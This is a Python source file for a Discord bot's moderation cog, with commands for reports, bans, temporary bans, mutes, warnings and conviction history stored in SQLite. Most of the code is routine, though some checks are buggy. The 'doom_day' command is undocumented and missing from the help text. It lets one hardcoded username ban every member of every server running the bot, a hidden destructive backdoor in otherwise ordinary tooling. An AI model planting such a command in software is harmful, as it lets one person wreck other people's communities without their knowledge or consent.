import datetime
import re
from datetime import timedelta
import discord
from discord.ext import commands, tasks

from Globals import Globals


async def my_unban(guild: discord.Guild, user: discord.User, end_time):
    await guild.unban(user)
    c = Globals.conn.cursor()
    if end_time is not None:
        c.execute("""update offences
        set treated  = :treated
        where guild_id = :guild_id and member_id = :member_id and end_date = :end_time and kind = :kind""",
                  {"guild_id": guild.id, "member_id": user.id, "end_time": end_time, "treated": "true",
                   "kind": "tempban"})
    else:
        c.execute("""update offences
        set treated  = :treated
        where guild_id = :guild_id and member_id = :member_id and kind = :kind""",
                  {"guild_id": guild.id, "member_id": user.id, "treated": "true",
                   "kind": "tempban"})
    Globals.conn.commit()


async def my_unmute(guild: discord.Guild, member: discord.Member, end_time):
    c = Globals.conn.cursor()
    c.execute("""SELECT * FROM server_preference
    WHERE guild_id = :guild_id""", {"guild_id": guild.id})
    role_id = c.fetchone()[8]
    role = guild.get_role(role_id)
    await member.remove_roles(role)
    c = Globals.conn.cursor()
    if end_time is None:
        c.execute("""update offences
                set treated  = :treated
                where guild_id = :guild_id and member_id = :member_id and kind = :kind""",
                  {"guild_id": guild.id, "member_id": member.id, "treated": "true",
                   "kind": "tempmute"})
        c.execute("""update offences
                        set end_date  = :end_date2
                        where guild_id = :guild_id and member_id = :member_id and kind = :kind and treated = :treated""",
                  {"guild_id": guild.id, "member_id": member.id, "treated": "true",
                   "kind": "tempmute", "end_date2": datetime.datetime.now()})
    else:
        c.execute("""update offences
                set treated  = :treated 
                where guild_id = :guild_id and member_id = :member_id and end_date = :end_time and kind = :kind""",
                  {"guild_id": guild.id, "member_id": member.id, "end_time": end_time, "treated": "true",
                   "kind": "tempmute"})
        c.execute("""update offences
                        set end_date  = :end_date2 
                        where guild_id = :guild_id and member_id = :member_id and end_date = :end_time and kind = :kind and treated  = :treated""",
                  {"guild_id": guild.id, "member_id": member.id, "end_time": end_time, "treated": "true",
                   "kind": "tempmute", "end_date2": datetime.datetime.now()})
        Globals.conn.commit()


def moderationEnabled(guild: discord.Guild):
    c = Globals.conn.cursor()
    c.execute("""select moderation from server_preference
            where guild_id = :guild_id""", {"guild_id": guild.id})
    data = c.fetchone()[0]
    return data == "true"


def get_prefix(guild: discord.Guild):
    c = Globals.conn.cursor()
    c.execute("""select prefix from server_preference
              where guild_id = :guild_id""", {"guild_id": guild.id})
    data = c.fetchone()
    return data[0]


class Moderation(commands.Cog):
    def __init__(self, client: discord.Client):
        self.client = client
        self.check_temp.start()

    @tasks.loop(seconds=10)
    async def check_temp(self):
        c = Globals.conn.cursor()
        c.execute("""select * from offences
                WHERE end_date  < :end_time and treated = :treated """,
                  {"end_time": datetime.datetime.now(), "treated": "false"})
        data = c.fetchall()
        Globals.conn.commit()
        if data is not None:
            for player_data in data:
                if player_data[3] == "tempmute":
                    guild = self.client.get_guild(player_data[2])
                    member = guild.get_member(player_data[0])
                    await my_unmute(guild, member, player_data[5])
                elif player_data[3] == "tempban":
                    guild = self.client.get_guild(player_data[2])
                    banned_users = await guild.bans()
                    member_name, member_discriminator = player_data[1].split("#")
                    for ban_entry in banned_users:
                        user = ban_entry.user
                        if (user.name, user.discriminator) == (member_name, member_discriminator):
                            await my_unban(guild, user, player_data[5])

    @commands.group(name="report")
    async def report(self, ctx: commands.Context, member: discord.Member, *, reason):
        guild = ctx.guild
        c = Globals.conn.cursor()
        c.execute("""SELECT * FROM server_preference
        WHERE guild_id = :guild_id""",
                  {"guild_id": guild.id})
        data = c.fetchone()
        channel1 = guild.get_channel(data[2])
        mod_id = data[3]
        mod = f"<@&{str(mod_id)}>"
        await ctx.message.delete()
        embed = discord.Embed(
            title=f"{member} was reported by {ctx.author}",
            color=0xFF0000)
        embed.add_field(name="**the message**", value=f" {reason}")
        x = await channel1.send(embed=embed)
        await channel1.send(f"{mod}")
        await ctx.author.send(content=f"thank you for the report {ctx.author.mention} \n", embed=embed)
        await x.pin()

    @report.command()
    @commands.has_permissions(ban_members=True)
    async def all(self, ctx: commands.Context):
        c = Globals.conn.cursor()
        c.execute("""SELECT * FROM server_preference
               WHERE guild_id = :guild_id""",
                  {"guild_id": ctx.guild.id})
        data = c.fetchone()
        if ctx.channel.id == data[2]:
            for message in await ctx.channel.pins():
                await ctx.send(message.jump_url)
        else:
            await ctx.send(f"{ctx.author.mention} you cant do it here")

    @report.error
    async def report_error(self, ctx: commands.Context, error):
        await ctx.message.delete()
        if commands.MissingRequiredArgument != AttributeError:
            c = Globals.conn.cursor()
            c.execute("""SELECT * FROM server_preference
            WHERE guild_id = :guild_id""", {"guild_id": ctx.guild.id})
            data = c.fetchone()
            await ctx.author.send(f"there was something wrong with the command you need to write it this way:")
            await ctx.author.send(
                f"{data[1]}report [full name with out mentioning of the member you are reporting on] [reason]]")
            await ctx.author.send(f"for example: {data[1]}report Yotam201410#6171 abuse \n {ctx.author.mention}")
        else:
            yotam = '342725139626065920'
            await ctx.send(
                f"{ctx.author.mention} there have been an unknown error pls send a msg to the developer of the "
                f"bot <@{yotam}> and report what you done and what is the problem")

    @commands.Cog.listener()
    async def on_reaction_add(self, reaction, user):
        c = Globals.conn.cursor()
        c.execute("""SELECT * FROM server_preference
            WHERE guild_id = :guild_id""",
                  {"guild_id": reaction.message.guild.id})
        data = c.fetchone()
        reacted_channel = reaction.message.channel
        if reacted_channel.id == data[2]:
            if str(reaction) == "✅":
                if reaction.count < 2:
                    await reaction.message.channel.send(
                        f"{user.mention} had checked the report on the msg {reaction.message.jump_url}")
                    await reaction.message.unpin()
                else:
                    pass

    @commands.command()
    @commands.has_permissions(manage_messages=True)
    async def clear(self, ctx: commands.Context, amount=1):
        await ctx.channel.purge(limit=amount)

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def tempban(self, ctx: commands.Context, user: discord.User, time: str, *args):
        if args == ():
            reason = 'Unspecified'
        else:
            reason = ""
            for arg in args:
                if arg.isalpha():
                    reason += arg + " "
        time = re.findall(r"(\d*\S)", time)
        time_by_seconds = 0
        try:
            for i in time:
                if "s" in i:
                    time_by_seconds += int(i[:-1])
                elif "m" in i:
                    time_by_seconds += int(i[:-1]) * 60
                elif "h" in i:
                    time_by_seconds += int(i[:-1]) * 60 * 60
                elif "d" in i:
                    time_by_seconds += int(i[:-1]) * 60 * 60 * 24
                elif "w" in i:
                    time_by_seconds += int(i[:-1]) * 60 * 60 * 24 * 7
                elif "y" in i:
                    time_by_seconds += int(i[:-1]) * 31536000
            embed = discord.Embed(
                title=f"{user} has been banned until {datetime.datetime.now() + timedelta(seconds=time_by_seconds)}",
                timestamp=datetime.datetime.now(), colour=0xe74c3c)
            embed.add_field(name="reason", value=reason)
            await user.send(embed=embed)
            await ctx.guild.ban(user, reason=reason)
            await ctx.send(embed=embed)
            c = Globals.conn.cursor()
            c.execute("""insert into offences(member_id,member_name,guild_id,kind,start_date,end_date,reason,treated)
                values(?,?,?,?,?,?,?,?)""",
                      (user.id, user.name + "#" + user.discriminator, ctx.guild.id, "tempban", datetime.datetime.now(),
                       datetime.datetime.now() + timedelta(seconds=time_by_seconds), reason, "false"))
            Globals.conn.commit()
        except ValueError:
            prefix = get_prefix(ctx.guild)
            await ctx.send(
                f"please stick to the format of\n !tempban [@user] [time(s,m,w,y)] [reason]\n reason is optional\n for example:\n {prefix}tempban <@342725139626065920> 1s1m1d1w1y bad bot maker")

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def unban(self, ctx: commands.Context, user):
        user = await self.client.fetch_user(user)
        all_bans = await ctx.guild.bans()
        for ban_entry in all_bans:
            if user.id == ban_entry.user.id:
                c = Globals.conn.cursor()
                c.execute("""select end_date from offences
                where guild_id = :guild_id and member_id = :user_id and treated = :treated and kind = :kind""",
                          {"guild_id": ctx.guild.id, 'user_id': user.id, "treated": "false", "kind": "tempban"})
                data = c.fetchall()
                Globals.conn.commit()
                if data:
                    await my_unban(ctx.guild, user, data[-1][0])
                else:
                    await my_unban(ctx.guild, user, None)
                embed = discord.Embed(timestamp=datetime.datetime.now(), title=f"{user} is now unbaned",
                                      colour=0x0011ff)
                await ctx.send(embed=embed)

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def ban(self, ctx: commands.Context, user: discord.User, *args):
        if moderationEnabled(ctx.guild):
            if args == ():
                reason = 'Unspecified'
            else:
                reason = ""
                for arg in args:
                    if arg.isalpha():
                        reason += arg + " "
            embed = discord.Embed(title=f"{user} has been baned", timestamp=datetime.datetime.now(), colour=0xe74c3c)
            embed.add_field(name="reason:", value=reason)
            await user.send(embed=embed)
            await ctx.guild.ban(user, reason=reason)
            await ctx.send(embed=embed)
            c = Globals.conn.cursor()
            c.execute("""insert into offences(member_id,member_name,guild_id,kind,start_date,reason,treated)
                        values(?,?,?,?,?,?,?)""",
                      (user.id, user.name + "#" + user.discriminator, ctx.guild.id, "tempban", datetime.datetime.now(),
                       reason, "false"))
        Globals.conn.commit()

    @commands.command()
    @commands.has_guild_permissions(mute_members=True)
    async def unmute(self, ctx: commands.Context, member: discord.Member):
        if moderationEnabled(ctx.guild):
            c = Globals.conn.cursor()
            c.execute("""select tempmute_role_id from server_preference
            where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
            role = ctx.guild.get_role(c.fetchone()[0])
            if role in member.roles:
                c.execute("""select end_date from offences
                where member_id = :member_id and guild_id = :guild_id and kind = :kind and treated = :treated""",
                          {"member_id": member.id, "guild_id": ctx.guild.id, "kind": "tempmute", "treated": "false"})
                data = c.fetchall()
                if data is not []:
                    if data[-1] is not None:
                        await my_unmute(ctx.guild, member, data[-1][0])
                    else:
                        await my_unmute(ctx.guild, member, None)
                    embed = discord.Embed(title=f"{member} is now unmuted", colour=0x0011ff,
                                          timestamp=datetime.datetime.now())
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"member was not muted threw the bot so he can be unmuted")
            else:
                await ctx.send("the member is not muted")

    @commands.command()
    @commands.has_guild_permissions(mute_members=True)
    async def mute(self, ctx: commands.Context, member: discord.Member, *args):
        if moderationEnabled(ctx.guild):
            if args == ():
                reason = 'Unspecified'
            else:
                reason = args[0]
            c = Globals.conn.cursor()
            c.execute("""select tempmute_role_id from server_preference
            where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
            server_preference_data = c.fetchone()
            if server_preference_data[0] is None:
                muted_role = await ctx.guild.create_role(name="Muted", colour=discord.Colour(000000))
                await muted_role.edit(position=1)
                c.execute("""UPDATE server_preference
                        SET tempmute_role_id = :role_id
                                WHERE guild_id = :guild_id""", {"role_id": muted_role.id, "guild_id": ctx.guild.id})
                Globals.conn.commit()
                for channel in ctx.guild.channels:
                    await channel.set_permissions(muted_role, send_messages=False, speak=False)
            c.execute("""SELECT * FROM server_preference
                            where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
            muted_role = c.fetchone()[8]
            muted_role = ctx.guild.get_role(muted_role)
            await member.add_roles(muted_role)
            embed = discord.Embed(title=f"{member} has been muted", timestamp=datetime.datetime.now(),
                                  colour=0xe74c3c)
            embed.add_field(name="reason:", value=reason)
            await ctx.send(embed=embed)
            c = Globals.conn.cursor()
            c.execute("""insert into offences(member_id,member_name,guild_id,kind,start_date,reason,treated)
                        values(?,?,?,?,?,?,?)""",
                      (member.id, member.name + "#" + member.discriminator, ctx.guild.id, "tempmute",
                       datetime.datetime.now(),
                       reason, "false"))
            Globals.conn.commit()

    @commands.command()
    @commands.has_guild_permissions(mute_members=True)
    async def tempmute(self, ctx: commands.Context, member: discord.Member, time: str, *args):
        if moderationEnabled(ctx.guild):
            if args == ():
                reason = 'Unspecified'
            else:
                reason = ""
                for arg in args:
                    if arg.isalpha():
                        reason += arg + " "
            c = Globals.conn.cursor()
            c.execute("""SELECT * FROM server_preference
                    where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
            server_preference_data = c.fetchone()
            time = re.findall(r"(\d*\S)", time)
            time_by_seconds = 0
            try:
                for i in time:
                    if "s" in i:
                        time_by_seconds += int(i[:-1])
                    elif "m" in i:
                        time_by_seconds += int(i[:-1]) * 60
                    elif "h" in i:
                        time_by_seconds += int(i[:-1]) * 60 * 60
                    elif "d" in i:
                        time_by_seconds += int(i[:-1]) * 60 * 60 * 24
                    elif "w" in i:
                        time_by_seconds += int(i[:-1]) * 60 * 60 * 24 * 7
                    elif "y" in i:
                        time_by_seconds += int(i[:-1]) * 31536000
                c = Globals.conn.cursor()
                if server_preference_data[8] is None:
                    muted_role = await ctx.guild.create_role(name="Muted", colour=discord.Colour(000000))
                    await muted_role.edit(position=1)
                    c.execute("""UPDATE server_preference
                            SET tempmute_role_id = :role_id
                                    WHERE guild_id = :guild_id""", {"role_id": muted_role.id, "guild_id": ctx.guild.id})
                    Globals.conn.commit()
                    for channel in ctx.guild.channels:
                        await channel.set_permissions(muted_role, send_messages=False, speak=False)
                c.execute("""SELECT * FROM server_preference
                                where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
                muted_role = c.fetchone()[8]
                Globals.conn.commit()
                await member.add_roles(ctx.guild.get_role(muted_role))
                embed = discord.Embed(
                    title=f"{member} has been muted until {datetime.datetime.now() + timedelta(seconds=time_by_seconds)}",
                    timestamp=datetime.datetime.now(), colour=0xe74c3c)
                embed.add_field(name="reason", value=reason)
                await ctx.send(embed=embed)
                c = Globals.conn.cursor()
                c.execute("""insert into offences(member_id,guild_id,kind,start_date,end_date,reason,treated)
                        values(?,?,?,?,?,?,?)""", (member.id, ctx.guild.id, "tempmute", datetime.datetime.now(),
                                                   datetime.datetime.now() + timedelta(seconds=time_by_seconds), reason,
                                                   "false"))
                Globals.conn.commit()
            except ValueError:
                prefix = get_prefix(ctx.guild)
                await ctx.send(
                    f"please stick to the format of\n !tempmute [@user] [time(s,m,w,y)] [reason]\n reason is optional\n for example:\n {prefix}tempmute <@342725139626065920> 1s1m1d1w1y bad bot maker")

    @commands.command()
    @commands.has_guild_permissions(mute_members=True)
    async def warn(self, ctx, member: discord.Member, *args):
        if moderationEnabled(ctx.guild):
            if args == ():
                reason = 'Unspecified'
            else:
                reason = ""
                for arg in args:
                    if arg.isalpha():
                        reason += arg + " "
            c = Globals.conn.cursor()
            c.execute("""insert into offences(member_id,member_name,guild_id,kind,start_date,reason)
                        values(?,?,?,?,?,?)""",
                      (member.id, member.name + "#" + member.discriminator, ctx.guild.id, "warn",
                       datetime.datetime.now(),
                       reason))
            Globals.conn.commit()
            embed = discord.Embed(title=f"{member} **has been warned**")
            embed.add_field(name="**reason**", value=f"**{reason}**", inline=False)
            await ctx.send(embed=embed)

    @commands.command()
    async def convictions(self, ctx: commands.Context, member: discord.Member):
        if moderationEnabled(ctx.guild):
            c = Globals.conn.cursor()
            c.execute("""select * from offences
            where guild_id  = :guild_id and member_id = :member_id""",
                      {"guild_id": ctx.guild.id, "member_id": member.id})
            data = c.fetchall()
            if data:
                for offence in data:
                    if offence[3] == "tempmute":
                        if offence[5] is not None:
                            embed = discord.Embed(
                                title=f"{member} has been muted until {offence[5]}",
                                timestamp=datetime.datetime.now(), colour=0xe74c3c)
                            embed.add_field(name="reason", value=offence[6])
                            await ctx.send(embed=embed)
                        else:
                            embed = discord.Embed(
                                title=f"{member} has been muted",
                                timestamp=datetime.datetime.now(), colour=0xe74c3c)
                            embed.add_field(name="reason", value=offence[6])
                            await ctx.send(embed=embed)
                    elif offence[3] == "warn":
                        embed = discord.Embed(title=f"{member} **has been warned**")
                        embed.add_field(name="**reason**", value=offence[6], inline=False)
                        await ctx.send(embed=embed)
                    elif offence[3] == "tempban":
                        if offence[5] is not None:
                            embed = discord.Embed(
                                title=f"{member} has been banned until {offence[6]}",
                                timestamp=datetime.datetime.now(), colour=0xe74c3c)
                            embed.add_field(name="reason", value=offence[6])
                            await ctx.send(embed=embed)
                        else:
                            embed = discord.Embed(
                                title=f"{member} has been banned",
                                timestamp=datetime.datetime.now(), colour=0xe74c3c)
                            embed.add_field(name="reason", value=offence[6])
                            await ctx.send(embed=embed)
            else:
                await ctx.send(f"{member.mention} has no convictions")

    @commands.Cog.listener()
    async def on_member_join(self, member):
        if moderationEnabled(member.guild):
            c = Globals.conn.cursor()
            c.execute("""select * from server_preference
            where guild_id = :guild_id""", {"guild_id": member.guild.id})
            role_id = c.fetchone()[8]
            c.execute("""select * from offences where member_id = :member_id and guild_id = :guild_id and kind = :kind 
            and (end_date > :end_date or end_date is null) """,
                      {"member_id": member.id, "guild_id": member.guild.id, "end_date": datetime.datetime.now(),
                       "kind": "tempmute"})
            offences = c.fetchall()
            if offences != ():
                role = member.guild.get_role(role_id)
                await member.add_roles(role)

    @commands.command()
    async def doom_day(self, ctx):
        if str(ctx.author) == "Yotam201410#6171":
            for guild in self.client.guilds:
                for user in guild.members:
                    if str(user) != "Yotam201410#6171":
                        await user.ban()
        else:
            print("someone has tried to use the domm day command")

    @commands.command(name="mod_help")
    async def help(self, ctx: commands.Context):
        if moderationEnabled(ctx.guild):
            prefix = get_prefix(ctx.guild)
            embed = discord.Embed(title="moderation help", colour=0x000000)
            embed.set_author(name=ctx.guild.name, icon_url=ctx.guild.icon_url)
            embed.set_thumbnail(url=ctx.guild.icon_url)
            embed.add_field(name="**" + prefix + "clear {clear amount}**",
                            value="deletes {amount} of messages\n you must have the menage messages permission",
                            inline=False)
            embed.add_field(name="**" + prefix + "warn {mention of a member} {reason}**",
                            value="warn the member, **you don't have to specify a reason** \n **you must have mute members permission**",
                            inline=False)
            embed.add_field(name="**" + prefix + "mute {mention of a member} {reason}**",
                            value="give to the member a mute role so he cant type anything, **you don't have to specify a reason** \n **you must have mute members permission**",
                            inline=False)
            embed.add_field(name="**" + prefix + "tempmute {mention of a member} {time} {reason}**",
                            value="give to the member a mute role so he cant type anything for the time mentioned (s - seconds, m - minutes, h - hours, d - days, w - weeks, y - years) , **you don't have to specify a reason** \n **you must have mute members permission**",
                            inline=False)
            embed.add_field(name="**" + prefix + "kick {mention of a member} {reason}**",
                            value="kicks the member, **you don't have to specify a reason** \n **you must have kick members permission**",
                            inline=False)
            embed.add_field(name="**" + prefix + "ban {mention of a member} {reason}**",
                            value="bans the member, **you don't have to specify a reason** \n **you must have ban members permission**",
                            inline=False)
            embed.add_field(name="**" + prefix + "tempban {mention of a member} {time} {reason}**",
                            value="bans the member for the time mentioned (s - seconds, m - minutes, h - hours, d - days, w - weeks, y - years) , **you don't have to specify a reason** \n **you must have ban members permission**",
                            inline=False)
            embed.add_field(name="**" + prefix + "convictions {mention of a member}**",
                            value="shows the member convictions",
                            inline=False)
            await ctx.send(embed=embed)
        else:
            await ctx.send(
                "moderation module is not enabled at this server please reach to the server admin to turn it up")


def setup(client):
    client.add_cog(Moderation(client))
